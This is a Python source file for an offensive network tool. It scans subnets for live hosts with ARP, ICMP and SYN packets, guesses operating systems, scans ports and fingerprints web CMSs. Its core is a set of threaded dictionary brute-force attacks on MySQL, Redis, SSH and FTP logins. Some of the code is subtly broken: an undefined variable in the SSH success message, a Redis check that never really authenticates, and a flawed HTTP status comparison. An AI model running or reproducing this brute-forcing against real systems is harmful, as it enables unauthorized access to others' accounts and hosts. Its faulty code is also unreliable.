# Author: Su
import os
from concurrent.futures import ThreadPoolExecutor,wait
from scapy.all import *
from optparse import OptionParser
import pymysql,paramiko,redis,ftplib,requests,re,json,hashlib

live_mainframe = []
dic = {}

def arp_scan(ip):
    # print(f"进行ARP方式扫描{20*'-'}")
    try:
        # 指定Ether后sr不会发包，所以使用srp
        result,unresult = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=ip),timeout=2,verbose=0)  #srp返回回复与未回复包，回复包后续使用，未回复包留着以防要用
    except Exception as e:
        print(e)
    else:
        # print(f"本次ARP扫描发现了{len(result)}台主机存活:")
        for send,reveive in result:
            live_mainframe.append(reveive.psrc)
            # print(f"{reveive.psrc}")  #输出存活ip
            # print(f"{reveive.src}")  #输出存活ip对应mac地址
    # for i in live_mainframe:
    #     print(i)

def tcp_syn_scan(ip):
    often_port_list = [20, 21, 22, 23, 25, 53, 67, 68, 80, 110, 119, 139, 161, 162, 389, 443, 445, 1433, 1521, 2049,
                       2094, 3306, 3389, 4000, 5555,5632, 5900, 7001, 8010, 8080, 8888]  # 常用端口列表
    # print(f"进行TCP方式扫描{20 * '-'}")
    tcp_sport = random.randint(1024,65536)  # 随机一个发送端口
    for i in often_port_list:
        packet = IP(id = random.randint(1, 65536),dst=ip)/TCP(sport = tcp_sport,dport=i)  # 构造tcp包
        try:
            result,unresult = sr(packet,timeout=1,verbose=0)
            res = str(result[0])
            # print(res)
        except Exception as e:
            pass
        else:
            if re.findall("SA",res):  # 返回syn或ack中含有flag  SA
                # print(f"{ip}主机在线")
                return True
            else:
                return False
def tcp_all(ip):
    global live_mainframe
    pre_ip = (ip.split('.')[:-1])  #分隔ip地址192.168.x
    pool = ThreadPoolExecutor(max_workers=50)
    task_list = [pool.submit(tcp_syn_scan, '.'.join(pre_ip)+'.'+str(i)) for i in range(1,255)]  # 拼凑ip地址传入函数扫描，并加入线程池
    wait(task_list)
    live_mainframe = list(set(live_mainframe))  #与arp结果进行比较，集合去除重复ip

def ICMP_scan(ip):#ICMP协议探测是否存活
    id_ip = random.randint(1, 65535)  # 随机产生IP ID位
    id_ping = random.randint(1, 65535)  # 随机产生ping ID位
    seq_ping = random.randint(1, 65535)  # 随机产生ping序列号位
    packet = IP(dst=ip, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping)  #构造ICMP包
    # packet.show()  # 测试使用显示数据包内容
    res = sr1(packet, timeout=1, verbose=False)
    # print(res.src)   # 输入为网址时查看网址ip
    if res:
        live_mainframe.append(ip)
        return True
    else:
        return False
def ICMP_all(ip):
    global live_mainframe
    # print(f"进行ICMP方式扫描{20 * '-'}")
    pre_ip = (ip.split('.')[:-1])  #分隔ip地址192.168.x
    pool = ThreadPoolExecutor(50)
    tasks = [pool.submit(ICMP_scan, '.'.join(pre_ip)+'.'+str(i)) for i in range(1,255)]  # 拼凑ip地址传入函数扫描，并加入线程池
    wait(tasks)
    live_mainframe = list(set(live_mainframe))  #与arp结果进行比较，集合去除重复ip
    # print(f"本次ICMP扫描发现了{len(live_mainframe)}台主机存活:")
    # for i in live_mainframe:
    #     print(f"{i}存活")

def scan_live_mainframe(ip):
    '''
    扫描存活主机
    :param ip: 要扫描的网段或者IP
    :return:
    '''
    if '/' in ip:
        arp_scan(ip)
        ICMP_all(ip)
        tcp_all(ip)
        print(f"本次扫描发现了{len(live_mainframe)}台主机存活:")
    else:
        if ICMP_scan(ip):
            live_mainframe.append(ip)
        elif tcp_syn_scan(ip):
            live_mainframe.append(ip)
        else:
            pass
    global dic
    def get_os(ip):
        if dic.get(ip) == True:
            return 0
        id_ip = random.randint(1, 65535)  # 随机产生IP ID位
        id_ping = random.randint(1, 65535)  # 随机产生ping ID位
        seq_ping = random.randint(1, 65535)  # 随机产生ping序列号位
        packet = IP(dst=ip, id=id_ip) / ICMP(id=id_ping, seq=seq_ping)  # 构造ICMP包
        # packet.show()  # 测试使用显示数据包内容
        res = sr1(packet, timeout=1, verbose=False)
        if res is None:
            dic[ip] = '未识别到该操作系统'
        elif int(res[IP].ttl) <=64:
            dic[ip] = 'Unix/Linux'
        else:
            dic[ip] = 'Windows'
    pool = ThreadPoolExecutor(max_workers=10)
    tasks = [pool.submit(get_os,i) for i in live_mainframe]
    wait(tasks)

def scan_port(host,ports=''):
    '''
    端口扫描，使用socket模块获取对应端口服务
    :param host:目标主机ip
    :param ports: 扫描端口范围，以-分隔，默认为‘’，此时扫描常用端口列表
    :return:
    '''
    often_port_list = [20, 21, 22, 23, 25, 53, 67, 68, 80, 110, 119, 139, 161, 162, 389, 443, 445, 1433, 1521, 2049,
                       2094, 3306,3307, 3389, 4000, 5632, 5900, 6379, 7001, 8010, 8080, 8888]  # 常用端口列表
    count = 0
    pool = ThreadPoolExecutor(100)  # 开启线程池进行扫描
    port_open = dict()  # 存放开放端口的字典
    def connect_socket(host, port):
        '''
        只在端口扫描中为线程池使用，并且使用外部参数，所以定义在端口扫描内部
        :param host:
        :param port:
        :return:
        '''
        nonlocal count
        nonlocal  port_open
        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        con.settimeout(0.1)
        con_result = con.connect_ex((host, port))  # 连接成功返回0
        con.close()
        if con_result == 0:
            try:
                port_open[port] = socket.getservbyport(port)  # 利用socket获取常用端口对应服务
            except socket.error:
                pass
            count += 1
    if ports=='':  # 未指定扫描端口时扫描常用端口列表
        tasks = [pool.submit(connect_socket, host, port) for port in often_port_list]
        wait(tasks)
    else:
        start_port, end_port = ports.split("-")
        tasks = [pool.submit(connect_socket, host, port) for port in range(int(start_port),int(end_port)+1)]
        wait(tasks)
    if count == 0:
        print(f"不好意思，{host}主机{ports}端口均未开放")
    else:
        print(f"{host}主机开启端口如下：------------------")
        for port in port_open:
            print(f"[+]{port}端口，服务为{port_open[port]}")

def attack_mysql(host,path,user='root',port=3306):
    '''
    爆破数据库密码，使用pymysql进行连接mysql数据库
    :param host: 目标主机地址
    :param path: 爆破密码字典路径
    :param user: 要连接的用户，默认为root
    :return:
    '''
    runing_flag = 0
    real_password = '未成功破解数据库密码！！！请换新字典进行尝试'
    if user=='root':
        real_password = real_password+'\t 可能无root远程登录权限'
    with open(path,'r') as f:
        passwords = f.readlines()
    def connect_mysql(password):
        nonlocal runing_flag,host,user,real_password,port
        print(f'[+] Trying {password}')
        if runing_flag == 1:
            return 0
        try:
            db = pymysql.connect(host=host,user=user,password=password,port=port)
            db.close()
            runing_flag = 1
            real_password = password
        except:
            pass
    pool = ThreadPoolExecutor(max_workers=100)
    tasks = [pool.submit(connect_mysql,password.strip()) for password in passwords]
    wait(tasks)
    print('爆破结果：',real_password)

def attack_redis(host,path,port=6379):
    runing_flag = 0
    real_password = '未成功破解数据库密码！！！请换新字典进行尝试'
    with open(path,'r') as f:
        passwords = f.readlines()
    def connect_redis(password):
        nonlocal runing_flag,host,real_password,port
        print(f'[+] Trying {password}')
        if runing_flag == 1:
            return 0
        try:
            r = redis.StrictRedis(host=host,port=port,password=password,decode_responses=True)
            r.close()
            runing_flag = 1
            real_password = password
        except:
            pass
    pool = ThreadPoolExecutor(max_workers=100)
    tasks = [pool.submit(connect_redis,password.strip()) for password in passwords]
    wait(tasks)
    print('爆破结果：',real_password)

def attack_ssh(host,path,user='root',port=22):
    runing_flag = 0
    real_password = '未成功破解ssh密码！！！请换新字典进行尝试'
    if user=='root':
        real_password = real_password+'\t 可能无root远程登录权限'
    with open(path,'r') as f:
        passwords = f.readlines()
    def connect_ssh(password):
        print(f'[+] Trying {password}')
        nonlocal runing_flag, host, user, real_password, port
        if runing_flag == 1:
            return 0
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(host, port, user, password=password, timeout=1.5)
            runing_flag = 1
            real_password = password
            ssh.close()
            print(f'\n[*] {str(host)} FTP Logon Succeeded: {user}/{passwd}')
        except:
            pass
    pool = ThreadPoolExecutor(max_workers=100)
    tasks = [pool.submit(connect_ssh, password.strip()) for password in passwords]
    wait(tasks)
    print('爆破结果：', real_password)

def attack_ftp(host,file):
    allow = {}
    real_password = '未成功破解ssh密码！！！请换新字典进行尝试'
    try:
        ftp = ftplib.FTP(host)
        ftp.login('anonymous','suyou@yousu.com')
        ftp.quit()
        print(f"{host}ftp允许匿名登录")
    except:
        print("anonymous登录失败")
    with open(file,mode='r') as f:
        userpasswds = f.readlines()
    def connect_ftp(user,passwd):
        nonlocal allow
        print(f'[+] Trying {user}/{passwd}')
        try:
            ftp = ftplib.FTP(host)
            ftp.login(user,passwd)
            ftp.quit()
            allow[user] = passwd
            print(f'\n[*] {host} FTP Logon Succeeded: {user}/{passwd}')
        except:
            pass
    pool = ThreadPoolExecutor(max_workers=100)
    tasks = [pool.submit(connect_ftp,userpasswd.split(':')[0],userpasswd.split(':')[1].strip()) for userpasswd in userpasswds]
    wait(tasks)
    print('爆破结果如下:')
    for key in allow:
        print(f'{key}/{allow[key]}')

def get_webtitle(url):
    user_agent_list = [
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
        ]
    header ={
        'Connection': 'close'
    }
    header['User-Agent'] = random.choice(user_agent_list)
    requests.packages.urllib3.disable_warnings()  # 取消ssl验证warning
    try:
        resp = requests.get(url,headers=header,verify=False,timeout=3)
        content = resp.content.decode()
        # print(content)  #测试
        obj = re.compile(r"<title>(?P<title>.*?)</title>",re.S)
        title = obj.findall(content)[0]
        print("web title:",title)
    except:
        print(f"{url}访问失败，请检查输入是否正确")
        sys.exit()

def get_cms_bydic(url,cms_fingers,threads=20):
    if not os.path.exists(cms_fingers):
        print("给定文件不存在目录中")
        sys.exit()
    print(f" 扫描目标: {url}")
    user_agent_list = [
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
    ]
    header = {
        'Connection': 'close'
    }
    header['User-Agent'] = random.choice(user_agent_list)
    with open(cms_fingers) as f:
        fingers = json.load(f)['data']
    if_complete = False
    fingers_count = len(fingers)
    count = 0
    print(f"CMS Fingers Count: {fingers_count}")
    print("正在扫描请稍等"+'-'*20)
    def compare_cms(finger):
        nonlocal url,if_complete,count,fingers_count
        # print('\r', f"扫描进度 {count}/{fingers_count}", end='', flush=True)  # 线程池开启后刷新有点错乱
        count +=1
        if if_complete:
            return 0
        path = finger.get("path")
        target_url = url + path if path[0]=='/' else url + '/' + path  # 拼凑特定文件路径
        # print(target_url)  #测试
        if requests.head(target_url) == 200:   # 判断网站是否存在该特定文件，若无，直接跳过
            match_pattern = finger.get("match_pattern")
        else:
            return 0
        resp = requests.get(target_url,headers=header,verify=False,timeout=3)
        real_md5 = hashlib.md5()
        real_md5.update(resp.text.encode("utf-8"))
        real_md5 = real_md5.hexdigest()  # 获取加密后的16进制字符串
        if real_md5 == match_pattern:  # 匹配成功后返回对应数据
            print(f"\nHint CMS名称: {finger.get('cms')}")
            print(f"Hint 指纹文件: {finger.get('path')}")
            print(f"Hint Md5: {finger.get('match_pattern')}\n")
            if_complete = True
    pool = ThreadPoolExecutor(max_workers=threads)
    tasks = [pool.submit(compare_cms,finger) for finger in fingers]
    wait(tasks)
    if not if_complete:
        print("CMS未识别")

def get_cms_byReptiles(url,proxy):
    user_agent_list = [
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
    ]
    header = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Connection": "close",
        "Host": "whatweb.bugscaner.com",
        "Origin": "http://whatweb.bugscaner.com",
        "Referer": "http://whatweb.bugscaner.com/look/",
    }
    header['User-Agent'] = random.choice(user_agent_list)
    check_url = 'http://whatweb.bugscaner.com/what.go'  # 在线cms查询网网址
    target_url = url.encode("gbk")
    data = {
        "url": target_url,
        "location_capcha": "no"
    }
    try:
        if proxy!="":
            proxy = {
                "http":proxy
            }
            resp = requests.post(check_url, headers=header, data=data,proxies=proxy)
        else:
            resp = requests.post(check_url, headers=header, data=data)
        dic = json.loads(resp.text)

        print("web CMS: ", ''.join(dic['CMS']))  # 获取CMS
        print("Web Servers: ", ''.join(dic['Web Servers']))  # 获取web server
    except:
        print("在线网址查询出现问题")


def main():
    usage = "Usage: %prog -i <ip addr> -P <port 1-65535> -f <filename> -u <url> -p <password file> -f <IP file> -t <threads numbers> -a <attack service name> -s <fingers file> --proxy <proxy ip> --user <attack service login name>......"
    parser = OptionParser(usage=usage)
    parser.add_option("-i","--ip",type="string",dest="ip",help="specify the IP address")
    parser.add_option("-P","--port",type="string",dest="ports",help="such as 1-65535,specify the IP port,If not, scan common ports")
    parser.add_option("-f","--filename",type="string",dest="filename",help="specify the IP addres file")
    parser.add_option("-t", "--threads",type="int", dest="threads", help="threads--attack default=20",default=20)
    parser.add_option("-p","--password",type="string",dest="password",help="password file")
    parser.add_option("-a",'--attackname',type="string",dest="attackname",help="attack target service")
    parser.add_option("-u","--url",type="string",dest="url",help="specify the website or the IP")
    parser.add_option("-z",action="store_true",dest='pachong',help='use Reptiles to get the url cms')
    parser.add_option("-s", "--fingers", dest="fingers", help='''specify the cms-fingers file,The file format is json {
    "cms": "dedecms",
    "file_type": "css",
    "type": "md5/patten/keyword",
    "match_pattern": "[md5值]",
    "path": "/public/static/css/style.css",
    "uptime": "2019-05-21 19:03:43"
}''', default="fingers_simple.json")
    parser.add_option("--proxy",type="string",dest="proxy",help="the Reptiles proxy",default="")
    parser.add_option("--user",type="string",dest="user",help="ssh or mysql username,default='root'",default='root')
    parser.add_option("--sshp",type="int",dest="ssh_port",help="ssh port default=22",default=22)
    parser.add_option("--mysqlp",type="int",dest="mysql_port",help="mysql port default=3306",default=3306)
    parser.add_option("--redisp",type="int",dest="redis_port",help="redis port default=6379",default=6379)
    (options,args) = parser.parse_args()
    ip = options.ip  # ip地址
    ports = options.ports  # 扫描端口范围
    filename = options.filename  # 要扫描ip地址文件
    threads = options.threads  # 开启线程，默认为20
    attackname = options.attackname  # 爆破服务名称
    password_path = options.password  # 爆破字典路径
    ssh_port=options.ssh_port  # ssh服务端口，默认为22
    mysql_port = options.mysql_port  # mysql服务端口名称。默认为3306
    redis_port = options.redis_port  # mysql服务端口名称。默认为6379
    username = options.user  # 用户名
    url = options.url  # 扫描网址
    cms_fingers = options.fingers  # cms识别的json文件
    pachong = options.pachong  # 是否使用在线识别网站识别cms
    proxy = options.proxy  # 使用爬虫时使用代理
    global live_mainframe
    if filename:  # 如果存放ip的文件存在
        if not os.path.exists(filename):
            print("The file is not exist in the dir!!!")
            sys.exit()
        with open(filename,mode='r') as f:
            ips = f.readlines()
        pool = ThreadPoolExecutor(max_workers=threads)
        tasks = [pool.submit(scan_live_mainframe,i.strip()) for i in ips]
        wait(tasks)
        if len(live_mainframe) == 0:
            print("本次扫描未发现存活主机")
        else:
            print("存活主机如下："+'-'*20)
            for key in dic:
                print(f"{key}     {dic[key]}")
    if ip and not attackname:
        # ip = '192.168.1.200'
        scan_live_mainframe(ip)
        for key in dic:
            print(f"{key}     {dic[key]}")
        if ports==None and ('/' not in ip):
            scan_port(ip)
        elif ports and ('/' not in ip):
            scan_port(ip,ports)
    if ip and attackname and password_path:
        if not os.path.exists(password_path):
            print("The file is not exist in the dir!!!")
            sys.exit()
        if attackname == 'mysql':
            attack_mysql(ip,password_path,username,mysql_port)
        elif attackname == 'ssh':
            attack_ssh(ip,password_path,username,ssh_port)
        elif attackname == 'redis':
            attack_redis(ip, password_path, redis_port)
        elif attackname == 'ftp':
            attack_ftp(ip,password_path)
    if url:
        print("查询网站为：", url)
        get_webtitle(url)
        if pachong:  # 若存在-z参数则使用爬虫进行获取cms
            get_cms_byReptiles(url,proxy)
        else:
            get_cms_bydic(url,cms_fingers,threads)


if __name__ == '__main__':
    main()